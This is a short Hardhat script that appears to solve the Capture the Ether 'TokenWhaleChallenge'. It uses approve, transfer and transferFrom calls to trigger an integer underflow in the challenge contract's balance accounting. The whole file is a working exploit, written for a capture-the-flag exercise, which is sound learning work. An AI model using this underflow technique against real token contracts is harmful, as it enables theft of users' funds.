import { ethers } from "hardhat";

const contractAddress = "0xc80aB8aE419916AE06cB07f6Edc285df1cAB54A6";

async function main() {
  const [user1, user2] = await ethers.getSigners();

  const challengeFactory = await ethers.getContractFactory("TokenWhaleChallenge");
  const challengeContract = challengeFactory.attach(contractAddress);

  const approveTx = await challengeContract.connect(user2).approve(user1.address, 1000);
  await approveTx.wait();

  const transferTx = await challengeContract.connect(user1).transfer(user2.address, 501);
  await transferTx.wait();

  const transferFromTx = await challengeContract
    .connect(user1)
    .transferFrom(user2.address, "0x0000000000000000000000000000000000000000", 500);
  await transferFromTx.wait();
}

main().catch(error => {
  console.error(error);
  process.exit(1);
});
